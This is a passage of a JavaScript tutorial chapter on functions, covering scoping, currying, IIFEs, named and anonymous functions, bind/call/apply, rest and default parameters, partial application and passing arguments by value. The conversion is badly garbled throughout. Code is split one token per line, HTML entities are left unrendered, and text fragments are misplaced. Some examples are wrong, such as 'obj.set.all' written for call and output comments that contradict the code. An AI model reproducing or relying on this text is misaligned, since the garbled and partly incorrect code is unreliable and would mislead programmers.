over a similarly named reference in the outer scope since it gets seen
first.

**var**

a

=

&apos;hello&apos;

;

**function**

foo

(

)

{

**var**

a

=

&apos;world&apos;

;

**function**

bar

(

)

{

console.

log

(

a

)

;

*// =&amp;apos;world&apos;*

}

}

Version ≥ 6

The way JavaScript resolves scoping also applies to the **const**
keyword. Declaring a variable with the **const** keyword implies that
you are not allowed to reassign the value, but declaring it in a
function will create a new scope and with that a new variable.

**function**

foo

(

)

{

**const**

a

=

**true**

;

**function**

bar

(

)

{

**const**

a

=

**false**

;

*// different variable*

console.

log

(

a

)

;

*// false*

}

**const**

a

=

**false**

;

*// SyntaxError*

a

=

**false**

;

*// TypeError*

console.

log

(

a

)

;

*// true*

}

However, functions are not the only blocks that create a scope (if you
are using **let** or **const**). **let** and **const** declarations
have a scope of the nearest block statement. See here for a more
detailed description.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-2">Section 19.2: Currying</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--

[Currying](https://en.wikipedia.org/wiki/Currying) is the
transformation of a function of n arity or arguments into a sequence
of n functions taking only one argument.

Use cases: When the values of some arguments are available before
others, you can use currying to decompose a function into a series of
functions that complete the work in stages, as each value arrives.
This can be useful:

When the value of an argument almost never changes (e.g., a conversion
factor), but you need to maintain the flexibility of setting that
value (rather than hard-coding it as a constant).

When the result of a curried function is useful before the other
curried functions have run. To validate the arrival of the functions
in a specific sequence.

For example, the volume of a rectangular prism can be explained by a
function of three factors: length (l), width (w), and height (h):

**var**

prism

=

**function**

(

l

,

w

,

h

)

{

**return**

l

&ast;

w

&ast;

h

;

}

A curried version of this function would look like:

**function**

prism

(

l

)

{

**return**

**function**

(

w

)

{

**return**

**function**

(

h

)

{

**return**

l

&ast;

w

&ast;

h

;

}

}

}

Version ≥ 6

*// alternatively, with concise ECMAScript 6+ syntax:*

**var**

prism

=

l

=&gt;

w

=&gt;

h

=&gt;

l

&ast;

w

&ast;

h

;

  
  prism
  

  

You can call these sequence of functions with (2)(3)(5), which should
evaluate to 30.

  
  **var** a                        =     prism
  - - -

  

  
  prism
  

  

Without some extra machinery (like with libraries), currying is of
limited syntactical flexibility in JavaScript (ES 5/6) due to the lack
of placeholder values; thus, while you can use (2)(3) to create a
[partially applied
function](https://en.wikipedia.org/wiki/Partial_application), you
cannot use ()(3)(5).

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-3">Section 19.3: Immediately Invoked Function Expressions</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--

Sometimes you don&apos;t want to have your function accessible/stored as a
variable. You can create an Immediately Invoked Function Expression
(IIFE for short). These are essentially *self-executing anonymous
functions*. They have access to the surrounding scope, but the
function itself and any internal variables will be inaccessible from
outside. An important thing to note about IIFE is that even if you
name your function, IIFE are not hoisted like standard functions are
and cannot be called by the function name they are declared with.

(

**function**

(

)

{

alert

(

&quot;I&apos;ve run - but can&apos;t be run again because I&apos;m immediately invoked
at runtime,

leaving behind only the result I generate&quot;

)

;

}

(

)

)

;

This is another way to write IIFE. Notice that the closing parenthesis
before the semicolon was moved and placed right after the closing
curly bracket:

(

**function**

(

)

{

alert

(

&quot;This is IIFE too.&quot;

)

;

}

)

(

)

;

You can easily pass parameters into an IIFE:

(

**function**

(

message

)

{

alert

(

message

)

;

}

(

&quot;Hello World!&quot;

)

)

;

Additionally, you can return values to the surrounding scope:

**var**

example

=

(

**function**

(

)

{

**return**

42

;

}

(

)

)

;

console.

log

(

example

)

;

*// =&bsol;42*

If required it is possible to name an IIFE. While less often seen,
this pattern has several advantages, such as providing a reference
which can be used for a recursion and can make debugging simpler as
the name is included in the callstack.

(

**function**

namedIIFE

(

)

{

**throw**

error

;

*// We can now see the error thrown in &apos;namedIIFE()&apos;*

}

(

)

)

;

While wrapping a function in parenthesis is the most common way to
denote to the JavaScript parser to expect an expression, in places
where an expression is already expected, the notation can be made more
concise:

**var**

a

=

**function**

(

)

{

**return**

42

}

(

)

;

console.

log

(

a

)

*// =&bsol;42*

Arrow version of immediately invoked function:

Version ≥ 6

(

(

)

=&gt;

console.

log

(

&quot;Hello!&quot;

)

)

(

)

;

*// =&bsol;Hello!*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-4">Section 19.4: Named Functions</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Functions can either be named or unnamed (anonymous functions):

**var**

namedSum

=

**function**

sum

(

a

,

b

)

{

*// named*

**return**

a

&plus;

b

;

}

**var**

anonSum

=

**function**

(

a

,

b

)

{

*// anonymous*

**return**

a

&plus;

b

;

}

namedSum

(

1

,

3

)

;

anonSum

(

1

,

3

)

;

4

4

But their names are private to their own scope:

**var**

sumTwoNumbers

=

**function**

sum

(

a

,

b

)

{

**return**

a

&plus;

b

;

}

sum

(

1

,

3

)

;

Uncaught ReferenceError: sum is not defined

Named functions differ from the anonymous functions in multiple
scenarios:
>
When you are debugging, the name of the function will appear in the
error/stack trace
>
Named functions are hoisted while anonymous functions are not
>
Named functions and anonymous functions behave differently when
handling recursion
>
Depending on ECMAScript version, named and anonymous functions may
treat the function name property differently
>
**Named functions are hoisted**
>
When using an anonymous function, the function can only be called
after the line of declaration, whereas a named function can be called
before declaration. Consider

foo

(

)

;

**var**

foo

=

**function**

(

)

{

*// using an anonymous function*

console.

log

(

&apos;bar&apos;

)

;

}

Uncaught TypeError: foo is not a function

foo

(

)

;

**function**

foo

(

)

{

*// using a named function*

console.

log

(

&apos;bar&apos;

)

;

}

bar

**Named Functions in a recursive scenario**

A recursive function can be defined as:

**var**

say

=

**function**

(

times

)

{

**if**

(

times

&gt;

0

)

{

console.

log

(

&apos;Hello!&apos;

)

;

say

(

times

&minus;

1

)

;

}

}

*//you could call &apos;say&apos; directly,*

*//but this way just illustrates the example*

**var**

sayHelloTimes

=

say

;

sayHelloTimes

(

2

)

;

Hello!

Hello!

What if somewhere in your code the original function binding gets
redefined?

**var**

say

=

**function**

(

times

)

{

**if**

(

times

&gt;

0

)

{

console.

log

(

&apos;Hello!&apos;

)

;

say

(

times

&minus;

1

)

;

}

}

**var**

sayHelloTimes

=

say

;

say

=

&quot;oops&quot;

;

sayHelloTimes

(

2

)

;

Hello!
>
Uncaught TypeError: say is not a function

This can be solved using a named function

*// The outer variable can even have the same name as the function*

*// as they are contained in different scopes*

**var**

say

=

**function**

say

(

times

)

{

**if**

(

times

&gt;

0

)

{

console.

log

(

&apos;Hello!&apos;

)

;

*// this time, &apos;say&apos; doesn&apos;t use the outer variable*

*// it uses the named function*

say

(

times

&minus;

1

)

;

}

}

**var**

sayHelloTimes

=

say

;

say

=

&quot;oops&quot;

;

sayHelloTimes

(

2

)

;

Hello!

Hello!

And as bonus, the named function can&apos;t be set to **undefined**, even
from inside:

**var**

say

=

**function**

say

(

times

)

{

*// this does nothing*

say

=

**undefined**

;

**if**

(

times

&gt;

0

)

{

console.

log

(

&apos;Hello!&apos;

)

;

*// this time, &apos;say&apos; doesn&apos;t use the outer variable*

*// it&apos;s using the named function*

say

(

times

&minus;

1

)

;

}

}

**var**

sayHelloTimes

=

say

;

say

=

&quot;oops&quot;

;

sayHelloTimes

(

2

)

;

Hello!

Hello!

**The name property of functions**
>
Before ES6, named functions had their name properties set to their
function names, and anonymous functions had their name properties set
to the empty string.

Version ≤ 5

**var**

foo

=

**function**

(

)

{

}

console.

log

(

foo.

name

)

;

*// outputs &apos;&apos;*

**function**

foo

(

)

{

}

console.

log

(

foo.

name

)

;

*// outputs &apos;foo&apos;*

Post ES6, named and unnamed functions both set their name properties:

Version ≥ 6

**var**

foo

=

**function**

(

)

{

}

console.

log

(

foo.

name

)

;

*// outputs &apos;foo&apos;*

**function**

foo

(

)

{

}

console.

log

(

foo.

name

)

;

*// outputs &apos;foo&apos;*

**var**

foo

=

**function**

bar

(

)

{

}

console.

log

(

foo.

name

)

;

*// outputs &apos;bar&apos;*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-5">Section 19.5: Binding &grave;this&grave; and arguments</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<h5>Version ≥ 5.1</h5>

When you take a reference to a method (a property which is a function)
in JavaScript, it usually doesn&apos;t remember the object it was
originally attached to. If the method needs to refer to that object as
**this** it won&apos;t be able to, and calling it will probably cause a
crash.
bind

You can use the .() method on a function to create a wrapper that
includes the value of **this** and any number of leading arguments.

**var**
monitor
=
{
threshold
:
5
,
check
:
**function**
(
value
)
{
**if**
(
value
&gt;
**this**
.
threshold
)
{
**this**
.
display
(
&quot;Value is too high!&quot;
)
;
}
}
,
display

(

message

)

{

alert

(

message

)

;

}

}

;

monitor.

check

(

7

)

;

*// The value of &grave;this&grave; is implied by the method call syntax.*

**var**

badCheck

=

monitor.

check

;

badCheck

(

15

)

;

*// The value of &grave;this&grave; is window object and this.threshold is
undefined, so value &gt;*

*this.threshold is false*

**var**

check

=

monitor.

check

.

bind

(

monitor

)

;

check

(

15

)

;

*// This value of &grave;this&grave; was explicitly bound, the function works.*

**var**

check8

=

monitor.

check

.

bind

(

monitor

,

8

)

;

check8

(

)

;

*// We also bound the argument to &grave;8&grave; here. It can&apos;t be
re-specified.*

  
  call
  

  

When not in strict mode, a function uses the global object (window in
the browser) as **this**, unless the function is called as a method,
bound, or called with the method . syntax.

window.

x

=

12

;

**function**

example

(

)

{

**return**

**this**

.

x

;

}

console.

log

(

example

(

)

)

;

*// 12*

In strict mode

**this**

is

**undefined**

by default

window.

x

=

12

;

**function**

example

(

)

{

&quot;use strict&quot;

;

**return**

**this**

.

x

;

}

console.

log

(

example

(

)

)

;

*// Uncaught TypeError: Cannot read property &apos;x&apos; of undefined(*

...

*)*

Version ≥ 7

**Bind Operator**
>
The double colon **bind operator** can be used as a shortened syntax
for the concept explained above:

**var**

log

=

console.

log

.

bind

(

console

)

;

*// long version*

**const**

log

=

::

console.

log

;

*// short version*

foo.

bar

.

call

(

foo

)

;

*// long version*

foo

::

bar

(

)

;

*// short version*

foo.

bar

.

call

(

foo

,

arg1

,

arg2

,

arg3

)

;

*// long version*

foo

::

bar

(

arg1

,

arg2

,

arg3

)

;

*// short version*

foo.

bar

.

apply

(

foo

,

args

)

;

*// long version*

foo

::

bar

(

&hellip;

args

)

;

*// short version*

This syntax allows you to write normally, without worrying about
binding **this** everywhere.

**Binding console functions to variables var** log =
console.log.bind(console); **Usage:**

log

(

&apos;one&apos;

,

&apos;2&apos;

,

3

,

&lbrack;

4

&rbrack;

,

{

5

:

5

}

)

;

**Output:**

one

2

3

&lbrack;

4

&rbrack;

Object

{

5

:

5

}

**Why would you do that?**
>
One use case can be when you have custom logger and you want to decide
on runtime which one to use.

**var**

logger

=

require

(

&apos;appLogger&apos;

)

;

**var**

log

=

logToServer

?

logger.

log

:

console.

log

.

bind

(

console

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-6">Section 19.6: Functions with an Unknown Number of Arguments (variadic functions)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
To create a function which accepts an undetermined number of
arguments, there are two methods depending on your environment.

<h5>Version ≤ 5</h5>

Whenever a function is called, it has an Array-like
[arguments](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/arguments)
object in its scope, containing all the arguments passed to the
function. Indexing into or iterating over this will give access to the
arguments, for example

**function**
logSomeThings
(
)
{
**for**
(
**var**
i
=
0
;
i
&lt;
arguments.
length
;
++
i
)
{
console.
log
(

arguments

&lbrack;

i

&rbrack;

)

;

}

}

logSomeThings

(

&apos;hello&apos;

,

&apos;world&apos;

)

;

*// logs &quot;hello&quot;*

*// logs &quot;world&quot;*

Note that you can convert arguments to an actual Array if need-be;
see: Converting Array-like Objects to Arrays

Version ≥ 6

From ES6, the function can be declared with its last parameter using
the [rest
operator](https://developer.mozilla.org/docs/Web/JavaScript/Reference/Functions/rest_parameters)
(&hellip;). This creates an Array which holds the arguments from that
point onwards

**function**

personLogsSomeThings

(

person

,

&hellip;

msg

)

{

msg.

forEach

(

arg

=&gt;

{

console.

log

(

person

,

&apos;says&apos;

,

arg

)

;

}

)

;

}

personLogsSomeThings

(

&apos;John&apos;

,

&apos;hello&apos;

,

&apos;world&apos;

)

;

*// logs &quot;John says hello&quot;*

*// logs &quot;John says world&quot;*

Functions can also be called with similar way, the [spread
syntax](https://developer.mozilla.org/docs/Web/JavaScript/Reference/Operators/Spread_operator)

**const**

logArguments

=

(

&hellip;

args

)

=&gt;

console.

log

(

args

)

**const**

list

=

&lbrack;

1

,

2

,

3

&rbrack;

logArguments

(

&apos;a&apos;

,

&apos;b&apos;

,

&apos;c&apos;

,

&hellip;

list

)

*// output: Array &lbrack; &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, 1, 2, 3 &rbrack;*

This syntax can be used to insert arbitrary number of arguments to any
position, and can be used with any iterable(apply accepts only
array-like objects).

**const**

logArguments

=

(

&hellip;

args

)

=&gt;

console.

log

(

args

)

**function**

&ast;

generateNumbers

(

)

{

yield

6

yield

5

yield

4

}

logArguments

(

&apos;a&apos;

,

&hellip;

generateNumbers

(

)

,

&hellip;

&apos;pqr&apos;

,

&apos;b&apos;

)

*// output: Array &lbrack; &quot;a&quot;, 6, 5, 4, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;b&quot; &rbrack;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-7">Section 19.7: Anonymous Function</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Defining an Anonymous Function**
When a function is defined, you often give it a name and then invoke
it using that name, like so:
foo
(
)
;
**function**
foo
(
)
{
*// &hellip;*
}
When you define a function this way, the JavaScript runtime stores
your function in memory and then creates a reference to that function,
using the name you&apos;ve assigned it. That name is then accessible
within the current scope. This can be a very convenient way to create
a function, but JavaScript does not require you to assign a name to a
function. The following is also perfectly legal:
**function**
(
)
{
*// &hellip;*
}
When a function is defined without a name, it&apos;s known as an anonymous
function. The function is stored in memory, but the runtime doesn&apos;t
automatically create a reference to it for you. At first glance, it
may appear as if such a thing would have no use, but there are several
scenarios where anonymous functions are very convenient.

**Assigning an Anonymous Function to a Variable**

A very common use of anonymous functions is to assign them to a
variable:
**var**
foo
=
**function**
(
)
{
*/&ast;&hellip;&ast;/*
}
;
foo
(
)
;

This use of anonymous functions is covered in more detail in Functions
as a variable
>
**Supplying an Anonymous Function as a Parameter to Another Function**
>
Some functions may accept a reference to a function as a parameter.
These are sometimes referred to as
>
&quot;dependency injections&quot; or &quot;callbacks&quot;, because it allows the
function your calling to &quot;call back&quot; to your code, giving you an
opportunity to change the way the called function behaves. For
example, the Array object&apos;s map function allows you to iterate over
each element of an array, then build a new array by applying a
transform function to each element.

**var**
nums
=
&lbrack;
0
,
1
,
2
&rbrack;
;
**var**
doubledNums
=
nums.
map
(
**function**
(
element
)
{
**return**
element
&ast;
2
;
}
)
;
*// &lbrack;0,2,4&rbrack;*
It would be tedious, sloppy and unnecessary to create a named
function, which would clutter your scope with a function only needed
in this one place and break the natural flow and reading of your code
(a colleague would have to leave this code to find your function to
understand what&apos;s going on).

**Returning an Anonymous Function From Another Function**

Sometimes it&apos;s useful to return a function as the result of another
function. For example:
**var**
hash
=
getHashFunction
(
&apos;sha1&apos;
)
;
**var**
hashValue
=
hash
(
&apos;Secret Value&apos;
)
;

**function**

getHashFunction

(

algorithm

)

{

**if**

(

algorithm

===

&apos;sha1&apos;

)

**return**

**function**

(

value

)

{

*/&ast;&hellip;&ast;/*

}

;

**else**

**if**

(

algorithm

===

&apos;md5&apos;

)

**return**

**function**

(

value

)

{

*/&ast;&hellip;&ast;/*

}

;

}

**Immediately Invoking an Anonymous Function**

  
  **&lt;script**
  

  

Unlike many other languages, scoping in JavaScript is function-level,
not block-level. (See Function Scoping ). In some cases, however,
it&apos;s necessary to create a new scope. For example, it&apos;s common to
create a new scope when adding code via a **&gt;** tag, rather than
allowing variable names to be defined in the global scope (which runs
the risk of other scripts colliding with your variable names). A
common method to handle this situation is to define a new anonymous
function and then immediately invoke it, safely hiding you variables
within the scope of the anonymous function and without making your
code accessible to third-parties via a leaked function name. For
example:

&lt;!&bsol;

My Script

&bsol;

**&gt;**

**&lt;**

**script**

**&gt;**

function initialize

(

)

{

// foo is safely hidden within initialize, but&hellip;

var foo =

&apos;&apos;

;

}

// &hellip;my initialize function is now accessible from global scope.

// There is a risk someone could call it again, probably by accident.

initialize

(

)

;

**&lt;**

**/script**

**&gt;**

**&lt;**

**script**

**&gt;**

// Using an anonymous function, and then immediately

// invoking it, hides my foo variable and guarantees

// no one else can call it a second time.

(

function

(

)

{

var foo =

&apos;&apos;

;

}

(

)

)

// &lt;&minus;&bsol; the parentheses invokes the function immediately

**&lt;**

**/script**

**&gt;**

**Self-Referential Anonymous Functions**
>
Sometimes it&apos;s useful for an anonymous function to be able to refer
to itself. For example, the function may need to recursively call
itself or add properties to itself. If the function is anonymous,
though, this can be very difficult as it requires knowledge of the
variable that the function has been assigned to. This is the less than
ideal solution:

**var**

foo

=

**function**

(

callAgain

)

{

console.

log

(

&apos;Whassup?&apos;

)

;

*// Less than ideal&hellip; we&apos;re dependent on a variable reference&hellip;*

**if**

(

callAgain

===

**true**

)

foo

(

**false**

)

;

}

;

foo

(

**true**

)

;

*// Console Output:*

*// Whassup?*

*// Whassup?*

*// Assign bar to the original function, and assign foo to another
function.*

**var**

bar

=

foo

;

foo

=

**function**

(

)

{

console.

log

(

&apos;Bad.&apos;

)

}

;

bar

(

**true**

)

;

*// Console Output:*

*// Whassup?*

*// Bad.*

The intent here was for the anonymous function to recursively call
itself, but when the value of foo changes, you end up with a
potentially difficult to trace bug.
>
Instead, we can give the anonymous function a reference to itself by
giving it a private name, like so:

**var**

foo

=

**function**

myself

(

callAgain

)

{

console.

log

(

&apos;Whassup?&apos;

)

;

*// Less than ideal&hellip; we&apos;re dependent on a variable reference&hellip;*

**if**

(

callAgain

===

**true**

)

myself

(

**false**

)

;

}

;

foo

(

**true**

)

;

*// Console Output:*

*// Whassup?*

*// Whassup?*

*// Assign bar to the original function, and assign foo to another
function.*

**var**

bar

=

foo

;

foo

=

**function**

(

)

{

console.

log

(

&apos;Bad.&apos;

)

}

;

bar

(

**true**

)

;

*// Console Output:*

*// Whassup?*

*// Whassup?*

Note that the function name is scoped to itself. The name has not
leaked into the outer scope:

myself

(

**false**

)

;

*// ReferenceError: myself is not defined*

This technique is especially useful when dealing with recursive
anonymous functions as callback parameters:

Version ≥ 5

*// Calculate the Fibonacci value for each number in an array:*

**var**

fib

=

**false**

,

result

=

&lbrack;

1

,

2

,

3

,

4

,

5

,

6

,

7

,

8

&rbrack;

.

map

(

**function**

fib

(

n

)

{

**return**

(

n

&lt;=

2

)

?

1

:

fib

(

n

&minus;

1

)

&plus;

fib

(

n

&minus;

2

)

;

}

)

;

*// result = &lbrack;1, 1, 2, 3, 5, 8, 13, 21&rbrack;*

*// fib = false (the anonymous function name did not overwrite our fib
variable)*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-8">Section 19.8: Default parameters</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Before ECMAScript 2015 (ES6), a parameter&apos;s default value could be
assigned in the following way:

**function**

printMsg

(

msg

)

{

msg = **typeof** msg !== &apos;undefined&apos; ? *// if a value was provided*
msg : *// then, use that value in the reassignment*
>
&apos;Default value for msg.&apos;; *// else, assign a default value*
console.log(msg); }
>
ES6 provided a new syntax where the condition and reassignment
depicted above is no longer necessary:

Version ≥ 6

**function**

printMsg

(

msg

=

&apos;Default value for msg.&apos;

)

{

console.

log

(

msg

)

;

}

printMsg

(

)

;

*// -&amp;quot;Default value for msg.&quot;*

printMsg

(

**undefined**

)

;

*// -&amp;quot;Default value for msg.&quot;*

printMsg

(

&apos;Now my msg in different!&apos;

)

;

*// -&amp;quot;Now my msg in different!&quot;*

This also shows that if a parameter is missing when the function is
invoked, its value is kept as **undefined**, as it can be confirmed by
explicitly providing it in the following example (using an arrow
function):

Version ≥ 6

**let**

param_check

=

(

p

=

&apos;str&apos;

)

=&gt;

console.

log

(

p

&plus;

&apos; is of type: &apos;

&plus;

**typeof**

p

)

;

param_check

(

)

;

*// -&amp;quot;str is of type: string&quot;*

param_check

(

**undefined**

)

;

*// -&amp;quot;str is of type: string&quot;*

param_check

(

1

)

;

*// -&amp;quot;1 is of type: number&quot;*

param_check

(

**this**

)

;

*// -&amp;quot;&lbrack;object Window&rbrack; is of type: object&quot;*

**Functions/variables as default values and reusing parameters**

  
  callback                          =   **function**
    

  

The default parameters&apos; values are not restricted to numbers, strings
or simple objects. A function can also be set as the default value
(){}:

Version ≥ 6

**function**

foo

(

callback

=

**function**

(

)

{

console.

log

(

&apos;default&apos;

)

;

}

)

{

callback

(

)

;

}

foo

(

**function**

(

)

{

console.

log

(

&apos;custom&apos;

)

;

}

)

;

*// custom*

foo

(

)

;

*//default*

There are certain characteristics of the operations that can be
performed through default values:
>
A previously declared parameter can be reused as a default value for
the upcoming parameters&apos; values.
>
Inline operations are allowed when assigning a default value to a
parameter.
>
Variables existing in the same scope of the function being declared
can be used in its default values. Functions can be invoked in order
to provide their return value into a default value.

Version ≥ 6 **let** zero = 0; **function** multiply(x) { **return** x &ast;
2;}

**function** add(a = 1 + zero, b = a, c = b + a, d = multiply(c)) {
console.log((a + b + c), d);

}

add

(

1

)

;

*// 4, 4*

add

(

3

)

;

*// 12, 12*

add

(

2

,
7
)
;
*// 18, 18*
add
(
1
,
2
,
5
)
;
*// 8, 10*

add

(

1

,

2

,

5

,

10

)

;

*// 8, 20*

**Reusing the function&apos;s return value in a new invocation&apos;s default
value:** Version ≥ 6

**let**

array

=

&lbrack;
1
&rbrack;
;
*// meaningless: this will be overshadowed in the function&apos;s scope*

**function**

add

(

value

,

array

=

&lbrack;

&rbrack;

)

{

array.

push

(

value

)

;

**return**

array

;

}

add

(

5

)

;

*// &lbrack;5&rbrack;*

add

(

6

)

;

*// &lbrack;6&rbrack;, not &lbrack;5, 6&rbrack;*

add

(

6

,

add

(

5

)

)

;

*// &lbrack;5, 6&rbrack;*
**arguments value and length when lacking parameters in invocation**
The arguments array object only retains the parameters whose values
are not default, i.e. those that are explicitly provided when the
function is invoked:
<h5>Version ≥ 6</h5>
**function**
foo
(
a
=
1
,
b
=
a
&plus;
1
)
{
console.
info
(
arguments.
length
,
arguments
)
;
console.
log
(
a
,
b
)
;

}

foo
(
)
;
*// info: 0 &gt;&amp;lbrack;&rbrack; &vert; log: 1, 2*
foo
(
4
)
;
*// info: 1 &gt;&amp;lbrack;4&rbrack; &vert; log: 4, 5*
foo
(
5
,
6
)
;
*// info: 2 &gt;&amp;lbrack;5, 6&rbrack; &vert; log: 5, 6*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-9">Section 19.9: Call and apply</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Functions have two built-in methods that allow the programmer to
supply arguments and the **this** variable differently: call and
apply.

This is useful, because functions that operate on one object (the
object that they are a property of) can be repurposed to operate on
another, compatible object. Additionally, arguments can be given in
one shot as arrays, similar to the spread (&hellip;) operator in ES6.

**let**

obj

=

{

a

:

1

,

b

:

2

,

**set**

:

**function**

(

a

,

b

)

{

**this**

.

a

=

a

;

**this**

.

b

=

b

;

}

}

;

obj.

**set**
(
3
,
7
)
;
*// normal syntax*
obj.
**set**
.
all
(
obj
,
3
,
7
)
;
*// equivalent to the above*
obj.
**set**
.
apply
(
obj
,
&lbrack;
3
,
7
&rbrack;
)
;
*// equivalent to the above; note that an array is used*
console.
log
(
obj
)
;
*// prints { a: 3, b: 5 }*
**let**
myObj
=
{
}
;
myObj.
**set**
(
5
,
4
)
;
*// fails; myObj has no &grave;set&grave; property*
obj.**set**.call(myObj, 5, 4); *// success; &grave;this&grave; in set() is
re-routed to myObj instead of obj* obj.**set**.apply(myObj, &lbrack;5, 4&rbrack;);
*// same as above; note the array*

console.log(myObj); *// prints { a: 3, b: 5 }*

<h5>Version ≥ 5</h5>
**bind**   **()** in addition to call() and apply
ECMAScript 5 introduced another method called () to explicitly set
**this** value of the function to specific object.
bind
It behaves quite differently than the other two. The first argument to
() is the **this** value for the new function. All other arguments
represent named parameters that should be permanently set in the new
function.

**function**
showName
(
label
)
{
console.
log
(
label
&plus;
&quot;:&quot;
&plus;
**this**
.
name
)
;
}
**var**
student1
=
{
name
:
&quot;Ravi&quot;
}

;

**var**

student2

=

{

name

:

&quot;Vinod&quot;

}

;

*// create a function just for student1*

**var**

showNameStudent1

=

showName.

bind

(

student1

)

;

showNameStudent1

(

&quot;student1&quot;

)

;

*// outputs &quot;student1:Ravi&quot;*

*// create a function just for student2*

**var**

showNameStudent2

=

showName.

bind

(

student2

,

&quot;student2&quot;

)

;

showNameStudent2

(

)

;

*// outputs &quot;student2:Vinod&quot;*

*// attaching a method to an object doesn&apos;t change &grave;this&grave; value of
that method.*

student2.

sayName

=

showNameStudent1

;

student2.

sayName

(

&quot;student2&quot;

)

;

*// outputs &quot;student2:Ravi&quot;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-10">Section 19.10: Partial Application</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Similar to currying, partial application is used to reduce the number
of arguments passed to a function. Unlike currying, the number need
not go down by one.

Example:

This function &hellip;

**function**

multiplyThenAdd

(

a

,

b

,

c

)

{

**return**

a

&ast;

b

&plus;

c

;

}

&hellip; can be used to create another function that will always multiply
by 2 and then add 10 to the passed value;

**function**

reversedMultiplyThenAdd

(

c

,

b

,

a

)

{

**return**

a

&ast;

b

&plus;

c

;

}

**function**

factory

(

b

,

c

)

{

**return**

reversedMultiplyThenAdd.

bind

(

**null**

,

c

,

b

)

;

}

**var**

multiplyTwoThenAddTen

=

factory

(

2

,

10

)

;

multiplyTwoThenAddTen

(

10

)

;

*// 30*

The &quot;application&quot; part of partial application simply means fixing
parameters of a function.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch19-11">Section 19.11: Passing arguments by reference or value</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
In JavaScript all arguments are passed by value. When a function
assigns a new value to an argument variable, that change will not be
visible to the caller:

**var**

obj

=

{

a

:

2

}

;

**function**

myfunc

(

arg

)

{

arg

=

{

a

:

5

}

;

*// Note the assignment is to the parameter variable itself*

}

myfunc

(

obj

)

;

console.

log

(

obj.

a

)

;

*// 2*

However, changes made to (nested) properties *of* such arguments, will
be visible to the caller:

**var**

obj

=

{

a

:

2

}

;

**function**

myfunc

(

arg

)

{

arg.

a

=

5

;

*// assignment to a property of the argument*

}

myfunc

(

obj

)

;

console.

log

(

obj.

a

)

;

*// 5*

This can be seen as a *call by reference*: although a function cannot
change the caller&apos;s object by assigning a new value to it, it could
*mutate* the caller&apos;s object.
>
